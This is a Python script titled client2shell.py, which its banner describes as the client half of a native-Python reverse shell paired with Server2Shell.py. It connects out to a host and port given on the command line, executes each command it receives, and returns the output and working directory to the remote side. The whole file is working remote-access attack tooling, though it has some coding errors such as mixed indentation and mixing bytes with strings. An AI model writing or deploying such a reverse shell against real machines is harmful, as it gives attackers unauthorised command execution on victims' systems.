import socket
import sys
import subprocess
import os

# Banner
def banner():
	os.system('cls')
	print("   ___ _ _            _   ____  __ _          _ _ ")
	print("  / __\ (_) ___ _ __ | |_|___ \/ _\ |__   ___| | |")
	print(" / /  | | |/ _ \ '_ \| __| __) \ \| '_ \ / _ \ | |")
	print("/ /___| | |  __/ | | | |_ / __/_\ \ | | |  __/ | |")
	print("\____/|_|_|\___|_| |_|\__|_____\__/_| |_|\___|_|_|")
	print ("+--------------------------------------------------------------------------------------------+")
	print ("| Author: glyph                                                                              |")
	print ("| Title: client2shell.py                                                                     |") 
	print ("| Creation Date: 19/02/2019                                                                  |")
	print ("| Version Control: 1.0					                                                     |") 
	print ("| Description: Couples with Server2Shell.py to produce a reverse shell using Native Python.  |")
	print ("| Usage: " + sys.argv[0][-15:] + " -t <target host> -p <target port> 						 |")
	print ("+--------------------------------------------------------------------------------------------+")


def usage():
	print ("Usage: " + str(sys.argv[0][-15:]) + " -t <target host> -p <target port>")

def main (argv):
	banner()
 	try:
 		if (argv[0] == '-t' and argv[1] and argv[2] == '-p' and argv[3]):
	 		HOST = str(argv[1])
	 		PORT = int(argv[3])
	 		print ("Attempting Connection:\n[+] " + HOST + "\n[+] Port: " + str(PORT))
 			s = socket.socket() 		 	
			s.connect((HOST, PORT))
			while True:
				data = s.recv(65535)
				if data[:2].decode("utf-8") == 'cd':
					os.chdir(data[3:].decode("utf-8"))
				try: 
					if len(data) > 0 or data[:4] != 'quit':
						cmd = subprocess.Popen(data, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						output_bytes = cmd.stdout.read() + cmd.stderr.read()
						s.send(output_bytes + os.getcwd() + '->')
				except WindowsError:
					break

			# Close connection
			print ("Closing Connection:")
			s.close()
 		else:
 			usage()
 	except IndexError:
 		usage()
 	except ValueError:
 		usage()
 	except socket.error:
 		print ("Error connecting to target. Check Host and Port.")

if __name__ == '__main__':
	main(sys.argv[1:])